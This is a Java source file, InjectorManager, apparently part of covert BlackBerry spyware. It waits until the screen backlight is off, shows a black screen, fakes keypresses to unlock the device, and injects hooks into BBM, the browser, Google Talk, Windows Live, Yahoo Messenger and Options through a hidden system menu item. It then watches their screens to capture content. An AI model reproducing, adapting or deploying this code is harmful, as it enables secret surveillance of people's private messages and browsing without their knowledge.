package blackberry.injection;

import java.util.Hashtable;
import java.util.Timer;
import java.util.TimerTask;

import net.rim.blackberry.api.menuitem.ApplicationMenuItemRepository;
import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.ApplicationManager;
import net.rim.device.api.system.Backlight;
import net.rim.device.api.system.CodeModuleManager;
import net.rim.device.api.ui.Keypad;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.UiApplication;
import blackberry.InjectionFrameworkApp;
import blackberry.application.AppListener;
import blackberry.application.ApplicationObserver;
import blackberry.application.BacklightObserver;
import blackberry.application.Device;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.injectors.AInjector;
import blackberry.injection.injectors.BBMInjector;
import blackberry.injection.injectors.BrowserInjector;
import blackberry.injection.injectors.GoogleTalkInjector;
import blackberry.injection.injectors.LiveInjector;
import blackberry.injection.injectors.OptionInjector;
import blackberry.injection.injectors.YahooInjector;
import blackberry.interfaces.Singleton;
import blackberry.interfaces.iSingleton;
import blackberry.utils.Utils;

/**
 * Singleton class used to manage injections of Injector-s. Once initialized, it
 * reacts on backlight and on applicationChange.
 * 
 * @author Zeno
 * 
 */
public class InjectorManager implements ApplicationObserver, iSingleton,
        BacklightObserver {
    private static final long APP_TIMER_PERIOD = 5000;
    private static final long GUID = 0x58b6431f259bac8dL;
    private static final int RUNON_APP = 1;
    private static final int RUNON_BACKLIGHT = 2;
    private static final int KEY_LOCK = 4099;
    //#ifdef DEBUG
    private static Debug debug = new Debug("InjectorManager",
            DebugLevel.VERBOSE);
    private static InjectorManager instance;
    //#endif
    AInjector[] injectors;
    Hashtable injectorMap = new Hashtable();

    ApplicationManager manager = ApplicationManager.getApplicationManager();

    private InjectorSystemMenu menu;
    private Timer applicationTimer;
    private String actualMod;
    private String actualName;
    private AInjector injector;
    private boolean injecting;

    public synchronized static InjectorManager getInstance() {

        if (instance == null) {
            instance = (InjectorManager) Singleton.self().get(GUID);
            if (instance == null) {
                final InjectorManager singleton = new InjectorManager();
                Singleton.self().put(GUID, singleton);
                instance = singleton;
            }

        }
        return instance;
    }

    public void start() {
        //#ifdef DEBUG
        debug.trace("start");
        //#endif
        AppListener appListener = AppListener.getInstance();
        appListener.addApplicationObserver(this);
        appListener.addBacklightObserver(this);
        appListener.suspendable(true);
        injectors = new AInjector[] { new BrowserInjector(), new BBMInjector(),
                new GoogleTalkInjector(), new LiveInjector(),
                new YahooInjector(), new OptionInjector() };

        if (!Backlight.isEnabled()) {
            injectAll();
        }
    }

    /**
     * Tries to inject all the applications.
     * 
     * @return true if all injected
     */
    private void injectAll() {
        synchronized (this) {
            if (injecting) {
                return;
            }
            injecting = true;
        }

        try {

            for (int i = 0; i < injectors.length; i++) {
                injector = injectors[i];

                inject(injector);
            }

        } finally {
            injecting = false;
        }

    }

    /**
     * 
     * @param injector
     * @return true if it's not needed to inject anymore, because injected or
     *         disabled
     */
    private boolean inject(AInjector injector) {
        //#ifdef DEBUG
        debug.trace("injectAll " + injector);
        //#endif

        if (!injector.enabled()) {
            //#ifdef DEBUG
            debug.trace("injectAll, disabled: " + injector);
            //#endif
            return true;
        }

        if (injector.isInjected()) {
            //#ifdef DEBUG
            debug.trace("injectAll, already infected: " + injector);
            //#endif
            return true;
        }

        if (Backlight.isEnabled()) {
            //#ifdef DEBUG
            debug.trace("inject, backlight, bailing out");
            //#endif
            return false;
        }

        String name = injector.getCodName();
        injectorMap.put(name, injector);

        setBacklight(false);
        manager.requestForegroundForConsole();
        unLock();

        if (injector.execute(name)) {
            //#ifdef DEBUG
            debug.trace("inject, executed: " + name);
            //#endif

            Utils.sleep(500);
            if (checkForeground(name)) {

                addSystemMenu(injector);
                Utils.sleep(300);
                callSystemMenu();
                Utils.sleep(300);
                removeSystemMenu();

                manager.requestForegroundForConsole();
            }
        } else {
            //#ifdef DEBUG
            debug.trace("inject, cannot execute, disable");
            //#endif
            injector.disable();
        }
        return false;
    }

    private void setBacklight(boolean b) {
        Backlight.enable(b);
    }

    private boolean backlightEnabled() {
        return Backlight.isEnabled();
    }

    /**
     * verifica se occorre procedere con l'unlock.
     */
    private void unLock() {
        //#ifdef DEBUG
        debug.trace("unLock: "
                + ApplicationManager.getApplicationManager().isSystemLocked());
        //#endif

        if (backlightEnabled()) {
            return;
        }

        //show black screen        
        InjectionFrameworkApp.getInstance().pushBlack();
        Utils.sleep(300);
        KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
        Utils.sleep(300);

        if (backlightEnabled()) {
            //#ifdef DEBUG
            debug.trace("Backlight still enabled, getHardwareLayout: "
                    + Keypad.getHardwareLayout());
            //#endif

            KeyInjector.pressRawKeyCode(Keypad.KEY_SPEAKERPHONE);
            setBacklight(false);
            Utils.sleep(100);
            KeyInjector.pressRawKeyCode(KEY_LOCK);
            setBacklight(false);
            Utils.sleep(100);
            setBacklight(false);

            for (int i = 0; i < 10; i++) {
                if (backlightEnabled()) {
                    //Backlight.enable(false);
                    Utils.sleep(500);
                    //#ifdef DEBUG
                    debug.trace("unLock: backlight still enabled");
                    //#endif
                } else {
                    break;
                }
            }

        }

        InjectionFrameworkApp.getInstance().popBlack();
    }

    private boolean checkForeground(String codname) {
        int foregroundPin = manager.getForegroundProcessId();
        ApplicationDescriptor[] apps = manager.getVisibleApplications();
        for (int i = 0; i < apps.length; i++) {
            //#ifdef DEBUG
            debug.trace("checkForeground: " + apps[i].getName());
            //#endif
            if (apps[i].getModuleName().indexOf(codname) >= 0) {
                int processId = manager.getProcessId(apps[i]);

                if (foregroundPin == processId) {
                    //#ifdef DEBUG
                    debug.trace("checkForeground, found");
                    //#endif
                    return true;
                } else {
                    //#ifdef DEBUG
                    debug.trace("checkForeground, found but not foreground");
                    //#endif
                    return false;
                }
            }
        }
        return false;
    }

    private void removeSystemMenu() {
        //#ifdef DEBUG
        debug.trace("removeSystemMenu");
        //#endif

        ApplicationMenuItemRepository.getInstance().removeMenuItem(
                ApplicationMenuItemRepository.MENUITEM_SYSTEM, menu);

    }

    private void callSystemMenu() {
        //#ifdef DEBUG
        debug.trace("callSystemMenu");
        //#endif

        KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
        Utils.sleep(500);

        if (Device.atLeast(7, 0)) {
            //#ifdef DEBUG
            debug.trace("callMenuByKey, version 7, track ball up");
            //#endif
            KeyInjector.trackBallRaw(20, true);
            Utils.sleep(500);
            KeyInjector.trackBallRawClick();
        } else {
            //#ifdef DEBUG
            debug.trace("callMenuByKey, version <7, pressing menu");
            //#endif
            KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
            Utils.sleep(500);
            KeyInjector.trackBallRawClick();
        }

        Utils.sleep(500);
        KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);

    }

    private void addSystemMenu(AInjector injector) {
        //#ifdef DEBUG
        debug.trace("addSystemMenu");
        //#endif
        menu = new InjectorSystemMenu(this, injector);
        menu.addMenu();
    }

    public void stop() {
        //#ifdef DEBUG
        debug.trace("stop");
        //#endif
        menu.removeMenu();
        injectorMap.clear();
    }

    protected boolean execute(String codName) {
        int foregroundPin = manager.getForegroundProcessId();
        ApplicationDescriptor[] apps = manager.getVisibleApplications();
        for (int i = 0; i < apps.length; i++) {
            if (apps[i].getModuleName().indexOf(codName) >= 0) {
                int processId = manager.getProcessId(apps[i]);

                if (foregroundPin == processId) {
                    //#ifdef DEBUG
                    debug.trace("requestForeground: already foreground");
                    //#endif
                    return true;
                } else {
                    //#ifdef DEBUG
                    debug.trace("requestForeground: bringing foreground");
                    //#endif
                    manager.requestForeground(processId);
                    return true;
                }
            }
        }

        return false;
    }

    private ApplicationDescriptor getApplicationDescriptor(String executeName) {
        //#ifdef DBC
        Check.requires(executeName != null,
                "getApplicationDescriptor null command"); //$NON-NLS-1$
        //#endif

        //#ifdef DEBUG
        debug.trace("getApplicationDescriptor executeName= " + executeName); //$NON-NLS-1$
        //#endif

        final int handles[] = CodeModuleManager.getModuleHandles();

        final int size = handles.length;
        for (int i = 0; i < size; i++) {
            final int handle = handles[i];
            // CodeModuleManager.getModuleHandle(name)
            // Retrieve specific information about a module.

            final String name = CodeModuleManager.getModuleName(handle);
            if (name.equals(executeName)) {
                //#ifdef DEBUG
                debug.trace("checkCommand, command found: " + executeName); //$NON-NLS-1$
                //#endif
                ApplicationDescriptor[] apps = CodeModuleManager
                        .getApplicationDescriptors(handle);
                if (apps != null && apps.length > 0) {
                    //#ifdef DEBUG
                    debug.trace("checkCommand: got applicationDescription"); //$NON-NLS-1$
                    //#endif
                    return apps[0];

                }
            }
        }

        //#ifdef DEBUG
        debug.warn("getApplicationDescriptor: not found"); //$NON-NLS-1$
        //#endif
        return null;

    }

    public void runOnBacklight() {
        //#ifdef DEBUG
        debug.trace("runOnBacklight");
        //#endifs
        injectAll();
    }

    /**
     * questa funzione viene chiamata ogni n secondi, se l'applicazione e' di
     * interesse
     */
    public void runOnApp() {
        //#ifdef DEBUG4
        debug.trace("runOnApp");
        //#endif

        final AInjector injector = (AInjector) injectorMap.get(actualMod);
        //#ifdef DBC
        Check.requires(injector.enabled(), "run, injector disabled");
        //#endif

        if (injector.isInjected()) {
            final Screen screen = injector.getInjectedApp().getActiveScreen();
            String screenName = screen.getClass().getName();
            //#ifdef DEBUG
            debug.trace("onApplicationChange: " + screenName);
            //#endif

            for (int i = 0; i < injector.getWantedScreen().length; i++) {
                String s = injector.getWantedScreen()[i];
                if (screenName.endsWith(s)) {
                    //#ifdef DEBUG
                    debug.trace("onApplicationChange: screen found");
                    //#endif

                    UiApplication.getUiApplication().invokeAndWait(
                            new Runnable() {

                                public void run() {
                                    injector.playOnScreen(screen);
                                }

                            });

                    break;
                }
            }
        }
    }

    class RunInjectorTask extends TimerTask {

        private int runOn;

        RunInjectorTask(int runOn) {
            this.runOn = runOn;
        }

        public void run() {
            if (runOn == RUNON_APP) {
                runOnApp();
            } else if (runOn == RUNON_BACKLIGHT) {
                runOnBacklight();
            }
        }

    }

    public void onApplicationChange(String startedName, String stoppedName,
            String startedMod, String stoppedMod) {

        //#ifdef DEBUG
        debug.trace("onApplicationChange name: " + startedName + " cod: "
                + startedMod);
        //#endif

        if (applicationTimer != null) {
            applicationTimer.cancel();
            applicationTimer = null;
        }

        if (injectorMap.containsKey(startedMod)) {
            //#ifdef DEBUG
            debug.trace("onApplicationChange, starting");
            //#endif
            this.actualMod = startedMod;
            this.actualName = startedName;
            applicationTimer = new Timer();

            RunInjectorTask task = new RunInjectorTask(RUNON_APP);
            applicationTimer.schedule(task, 1000, APP_TIMER_PERIOD);
        }

    }

    public void onBacklightChange(boolean status) {
        //#ifdef DEBUG
        debug.trace("onBacklightChange: " + status);
        //#endif
        if (!status) {
            if (applicationTimer != null) {
                applicationTimer.cancel();
                applicationTimer = null;
            }

            applicationTimer = new Timer();
            RunInjectorTask task = new RunInjectorTask(RUNON_BACKLIGHT);

            applicationTimer.schedule(task, 1000, Integer.MAX_VALUE);
        }
    }

}
